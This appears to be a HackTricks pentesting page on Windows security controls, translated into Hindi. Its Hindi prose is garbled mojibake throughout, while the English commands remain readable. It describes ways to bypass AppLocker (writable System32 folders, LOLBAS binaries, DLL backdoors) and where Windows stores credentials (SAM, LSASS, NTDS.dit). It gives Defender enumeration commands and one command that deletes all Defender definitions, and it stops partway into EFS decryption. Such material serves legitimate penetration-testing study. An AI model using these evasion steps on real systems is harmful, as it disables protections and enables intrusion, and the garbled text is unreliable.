# Windows рд╕реБрд░рдХреНрд╖рд╛ рдирд┐рдпрдВрддреНрд░рдг

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_campaign=hacktrics\&utm_medium=banner\&utm_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд **рд╡рд░реНрдХрдлреНрд▓реЛ рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдмрдирд╛рдПрдВ рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░реЗрдВ**ред\
рдЖрдЬ рд╣реА рдПрдХреНрд╕реЗрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## AppLocker рдиреАрддрд┐

рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯ рдПрдХ рдкреНрд░рдХрд╛рд░ рдХреА рд╕реВрдЪреА рд╣реЛрддреА рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЕрдиреБрдореЛрджрд┐рдд рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдпрд╛ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓реНрд╕ рд╣реЛрддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдореМрдЬреВрдж рд╣реЛрдиреЗ рдФрд░ рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИред рдЗрд╕рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдореИрд▓рд╡реЗрдпрд░ рдФрд░ рдЕрдиреБрдореЛрджрд┐рдд рдирд╣реАрдВ рдХрд┐рдП рдЧрдП рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рд╕реЗ рдкрд░реНрдпрд╛рд╡рд░рдг рдХреА рд░рдХреНрд╖рд╛ рдХрд░рдирд╛ рд╣реИ рдЬреЛ рд╕рдВрдЧрдарди рдХреА рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╡реНрдпрд╛рд╡рд╕рд╛рдпрд┐рдХ рдЬрд░реВрд░рддреЛрдВ рдХреЗ рдЕрдиреБрд░реВрдк рдирд╣реАрдВ рд╣реИред

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) Microsoft рдХрд╛ **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯрд┐рдВрдЧ рд╕рдорд╛рдзрд╛рди** рд╣реИ рдФрд░ рдпрд╣ рд╕рд┐рд╕реНрдЯрдо рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ рдХреЛ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ **рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреМрди рд╕реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдФрд░ рдлрд╛рдЗрд▓реЗрдВ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред рдпрд╣ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓реНрд╕, рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕, Windows рдЗрдВрд╕реНрдЯреЙрд▓рд░ рдлрд╛рдЗрд▓реНрд╕, DLLs, рдкреИрдХреЗрдЬреНрдб рдПрдкреНрд╕, рдФрд░ рдкреИрдХреНрдб рдПрдк рдЗрдВрд╕реНрдЯреЙрд▓рд░реНрд╕ рдкрд░ **рд╡рд┐рд╕реНрддреГрдд рдирд┐рдпрдВрддреНрд░рдг** рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред\
рдпрд╣ рдЖрдо рд╣реИ рдХрд┐ рд╕рдВрдЧрдарди **cmd.exe рдФрд░ PowerShell.exe рдХреЛ рдмреНрд▓реЙрдХ рдХрд░рддреЗ рд╣реИрдВ** рдФрд░ рдХреБрдЫ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реАрдЬ рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрддреЗ рд╣реИрдВ, **рд▓реЗрдХрд┐рди рдпрд╣ рд╕рдм рдмрд╛рдИрдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред

### рдЬрд╛рдВрдЪ

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреМрди рд╕реА рдлрд╛рдЗрд▓реЗрдВ/рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдмреНрд▓реИрдХрд▓рд┐рд╕реНрдЯреЗрдб/рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯреЗрдб рд╣реИрдВ:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
### рдмрд╛рдпрдкрд╛рд╕

* AppLocker рдиреАрддрд┐ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА **рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдлрд╝реЛрд▓реНрдбрд░**: рдпрджрд┐ AppLocker `C:\Windows\System32` рдпрд╛ `C:\Windows` рдХреЗ рдЕрдВрджрд░ рдХреБрдЫ рднреА рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд░рд╣рд╛ рд╣реИ, рддреЛ рд╡рд╣рд╛рдБ **рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдлрд╝реЛрд▓реНрдбрд░** рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ рдЖрдк **рдЗрд╕реЗ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* рдЖрдорддреМрд░ рдкрд░ **рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп** [**"LOLBAS's"**](https://lolbas-project.github.io/) рдмрд╛рдЗрдирд░реАрдЬрд╝ рднреА AppLocker рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддреА рд╣реИрдВред
* **рдЦрд░рд╛рдм рд▓рд┐рдЦреЗ рдЧрдП рдирд┐рдпрдореЛрдВ рдХреЛ рднреА рдмрд╛рдпрдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**
* рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, рдЖрдк рдХрд╣реАрдВ рднреА **`allowed` рдирд╛рдордХ рдлреЛрд▓реНрдбрд░ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдпрд╣ рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛рдПрдЧреАред
* рд╕рдВрдЧрдарди рдЕрдХреНрд╕рд░ **`%System32%\WindowsPowerShell\v1.0\powershell.exe` рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рдХреЛ рдмреНрд▓реЙрдХ рдХрд░рдиреЗ рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ**, рд▓реЗрдХрд┐рди рдЕрдиреНрдп [**PowerShell рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рд╕реНрдерд╛рдиреЛрдВ**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) рдЬреИрд╕реЗ `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` рдпрд╛ `PowerShell_ISE.exe` рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рднреВрд▓ рдЬрд╛рддреЗ рд╣реИрдВред
* **DLL рдкреНрд░рд╡рд░реНрддрди рдмрд╣реБрдд рдХрдо рд╕рдХреНрд╖рдо рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ** рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдПрдХ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдЕрддрд┐рд░рд┐рдХреНрдд рднрд╛рд░ рдбрд╛рд▓ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХреБрдЫ рднреА рдЯреВрдЯреЗрдЧрд╛ рдирд╣реАрдВ, рдЗрд╕рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рд╕рд╛рд░реА рдкрд░реАрдХреНрд╖рдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдЗрд╕рд▓рд┐рдП **DLLs рдХрд╛ рдЙрдкрдпреЛрдЧ рдмреИрдХрдбреЛрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд░рдиреЗ рд╕реЗ AppLocker рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдорд┐рд▓реЗрдЧреА**ред
* рдЖрдк [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) рдпрд╛ [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рд╕реА рднреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ **Powershell** рдХреЛрдб рдХреЛ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ AppLocker рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)ред

## рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рдВрдЧреНрд░рд╣рдг

### рд╕реБрд░рдХреНрд╖рд╛ рдЦрд╛рддреЗ рдкреНрд░рдмрдВрдзрдХ (SAM)

рд╕реНрдерд╛рдиреАрдп рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЗрд╕ рдлрд╛рдЗрд▓ рдореЗрдВ рдореМрдЬреВрдж рд╣реИрдВ, рдкрд╛рд╕рд╡рд░реНрдб рд╣реИрд╢ рдХрд┐рдП рдЧрдП рд╣реИрдВред

### рд╕реНрдерд╛рдиреАрдп рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рд╛рдзрд┐рдХрд░рдг (LSA) - LSASS

**рдкреНрд░рдорд╛рдгреАрдХрд░рдг** (рд╣реИрд╢) рдЗрд╕ рдЙрдкрдкреНрд░рдгрд╛рд▓реА рдХреА **рдореЗрдореЛрд░реА** рдореЗрдВ **рд╕рд╣реЗрдЬреЗ рдЧрдП** рд╣реИрдВ рдПрдХрд▓ рд╕рд╛рдЗрди-рдСрди рдХрд╛рд░рдгреЛрдВ рдХреЗ рд▓рд┐рдПред\
**LSA** рд╕реНрдерд╛рдиреАрдп **рд╕реБрд░рдХреНрд╖рд╛ рдиреАрддрд┐** (рдкрд╛рд╕рд╡рд░реНрдб рдиреАрддрд┐, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдиреБрдорддрд┐рдпрд╛рдБ...), **рдкреНрд░рдорд╛рдгреАрдХрд░рдг**, **рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди**... рдХрд╛ рдкреНрд░рдмрдВрдзрди рдХрд░рддрд╛ рд╣реИред\
LSA рд╡рд╣ рд╣реЛрдЧрд╛ рдЬреЛ **SAM** рдлрд╛рдЗрд▓ рдХреЗ рдЕрдВрджрд░ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА **рдЬрд╛рдВрдЪ** рдХрд░реЗрдЧрд╛ (рд╕реНрдерд╛рдиреАрдп рд▓реЙрдЧрд┐рди рдХреЗ рд▓рд┐рдП) рдФрд░ рдбреЛрдореЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░** рд╕реЗ **рдмрд╛рдд** рдХрд░реЗрдЧрд╛ред

**рдкреНрд░рдорд╛рдгреАрдХрд░рдг** **рдкреНрд░рдХреНрд░рд┐рдпрд╛ LSASS** рдХреЗ рдЕрдВрджрд░ **рд╕рд╣реЗрдЬреЗ рдЧрдП** рд╣реИрдВ: Kerberos рдЯрд┐рдХрдЯ, рд╣реИрд╢ NT рдФрд░ LM, рдЖрд╕рд╛рдиреА рд╕реЗ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдП рдЧрдП рдкрд╛рд╕рд╡рд░реНрдбред

### LSA рд╕реАрдХреНрд░реЗрдЯреНрд╕

LSA рдХреБрдЫ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдбрд┐рд╕реНрдХ рдореЗрдВ рд╕рд╣реЗрдЬ рд╕рдХрддрд╛ рд╣реИ:

* рдПрдХреНрдЯрд┐рд╡ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреЗ рдХрдВрдкреНрдпреВрдЯрд░ рдЦрд╛рддреЗ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб (рдкрд╣реБрдБрдЪ рд╕реЗ рдмрд╛рд╣рд░ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░)ред
* рд╡рд┐рдВрдбреЛрдЬ рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рдЦрд╛рддреЛрдВ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб
* рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдкрд╛рд╕рд╡рд░реНрдб
* рдФрд░ рдЕрдзрд┐рдХ (IIS рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб...)

### NTDS.dit

рдпрд╣ рдПрдХреНрдЯрд┐рд╡ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХрд╛ рдбреЗрдЯрд╛рдмреЗрд╕ рд╣реИред рдпрд╣ рдХреЗрд╡рд▓ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░реНрд╕ рдореЗрдВ рдореМрдЬреВрдж рд╣реИред

## рдбрд┐рдлреЗрдВрдбрд░

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) \*\*\*\* рдПрдХ рдПрдВрдЯреАрд╡рд╛рдпрд░рд╕ рд╣реИ рдЬреЛ Windows 10 рдФрд░ Windows 11 рдореЗрдВ, рдФрд░ Windows Server рдХреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ рдЙрдкрд▓рдмреНрдз рд╣реИред рдпрд╣ **`WinPEAS`** рдЬреИрд╕реЗ рд╕рд╛рдорд╛рдиреНрдп рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдЯреВрд▓реНрд╕ рдХреЛ **рдмреНрд▓реЙрдХ** рдХрд░рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрди рд╕реБрд░рдХреНрд╖рд╛рдУрдВ рдХреЛ **рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рддрд░реАрдХреЗ** рд╣реИрдВред

### рдЬрд╛рдВрдЪ

**Defender** рдХреА **рд╕реНрдерд┐рддрд┐** рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк PS cmdlet **`Get-MpComputerStatus`** рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдпрд╣ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдпрд╣ рд╕рдХреНрд░рд┐рдп рд╣реИ рдпрд╛ рдирд╣реАрдВ, **`RealTimeProtectionEnabled`** рдХреЗ рдорд╛рди рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

рдЗрд╕реЗ рд╕реВрдЪреАрдмрджреНрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдпрд╣ рднреА рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## EFS (рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо)

EFS рдПрдХ рдлрд╛рдЗрд▓ рдХреЛ рдПрдХ **рд╕рдордорд┐рдд рдХреБрдВрдЬреА** рд╕реЗ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рдХреЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рдлрд╛рдЗрд▓ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреА, рдпрд╛ **FEK** рдХреЗ рдирд╛рдо рд╕реЗ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред FEK рдХреЛ рдлрд┐рд░ рдЙрд╕ **рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА** рд╕реЗ **рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рдЬреБрдбрд╝реА рд╣реЛрддреА рд╣реИ рдЬрд┐рд╕рдиреЗ рдлрд╛рдЗрд▓ рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдпрд╛ рд╣реИ, рдФрд░ рдпрд╣ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб FEK рдХреЛ $EFS **рд╡реИрдХрд▓реНрдкрд┐рдХ рдбреЗрдЯрд╛ рд╕реНрдЯреНрд░реАрдо** рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдлрд╛рдЗрд▓ рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, EFS рдХрдВрдкреЛрдиреЗрдВрдЯ рдбреНрд░рд╛рдЗрд╡рд░ $EFS рд╕реНрдЯреНрд░реАрдо рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╕рдордорд┐рдд рдХреБрдВрдЬреА рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП EFS рдбрд┐рдЬрд┐рдЯрд▓ рдкреНрд░рдорд╛рдгрдкрддреНрд░ (рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдлрд╛рдЗрд▓ рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛) рд╕реЗ рдореЗрд▓ рдЦрд╛рдиреЗ рд╡рд╛рд▓реА **рдирд┐рдЬреА рдХреБрдВрдЬреА** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред [рдпрд╣рд╛рдБ](https://en.wikipedia.org/wiki/Encrypting_File_System) рд╕реЗред

рдЙрджрд╛рд╣рд░рдг рдЬрдм рдлрд╛рдЗрд▓реЗрдВ рдмрд┐рдирд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдЕрдиреБрд░реЛрдз рдХреЗ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рд╣реЛ рдЬрд╛рддреА рд╣реИрдВ:

* рдлрд╛рдЗрд▓реЗрдВ рдФрд░ рдлреЛрд▓реНрдбрд░реНрд╕ рдХреЛ [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table) рдЬреИрд╕реЗ рдЕрдиреНрдп рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд╕рд╛рде рдлреЙрд░реНрдореЗрдЯ рдХрд┐рдП рдЧрдП рд╡реЙрд▓реНрдпреВрдо рдореЗрдВ рдХреЙрдкреА рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдлрд╛рдЗрд▓реЗрдВ рдЬрдм SMB/CIFS рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рдХреЙрдкреА рдХреА рдЬрд╛рддреА рд╣реИрдВ, рддреЛ рдлрд╛рдЗрд▓реЗрдВ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рднреЗрдЬреЗ рдЬрд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХреА рдЬрд╛рддреА рд╣реИрдВред

рдЗрд╕ рд╡рд┐рдзрд┐ рд╕реЗ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдлрд╛рдЗрд▓реЛрдВ рдХреЛ **рдорд╛рд▓рд┐рдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдкрд╛рд░рджрд░реНрд╢реА рд░реВрдк рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ** (рдЬрд┐рд╕рдиреЗ рдЙрдиреНрд╣реЗрдВ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдпрд╛ рд╣реИ), рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рдЖрдк **рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрди рд╕рдХрддреЗ рд╣реИрдВ** рддреЛ рдЖрдк рдлрд╛рдЗрд▓реЛрдВ рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдмрджрд▓рдирд╛ рдФрд░ рдЙрд╕рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЙрдЧрд┐рди рдХрд░рдирд╛ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛)ред

### EFS рдЬрд╛рдирдХрд╛рд░реА рдЬрд╛рдВрдЪреЗрдВ

рдпрд╣ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдиреЗ рдЗрд╕ **рд╕реЗрд╡рд╛** рдХрд╛ **рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛** рд╣реИ рдпрд╣ рдкрде рдореМрдЬреВрдж рд╣реИ рдпрд╛ рдирд╣реАрдВ: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

рдЬрд╛рдВрдЪреЗрдВ **рдХрд┐рд╕рдХреЗ рдкрд╛рд╕** рдлрд╛рдЗрд▓ рддрдХ **рдкрд╣реБрдВрдЪ** рд╣реИ cipher /c \<file>\
рдЖрдк `cipher /e` рдФрд░ `cipher /d` рдХрд╛ рдЙрдкрдпреЛрдЧ рднреА рдПрдХ рдлреЛрд▓реНрдбрд░ рдХреЗ рдЕрдВрджрд░ рд╕рднреА рдлрд╛рдЗрд▓реЛрдВ рдХреЛ **рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ** рдФрд░ **рдбрд┐рдХреНрд░рд┐рдкреНрдЯ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### EFS рдлрд╛рдЗрд▓реЛрдВ рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдирд╛

#### рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рдгрд╛рд▓реА рд╣реЛрдирд╛

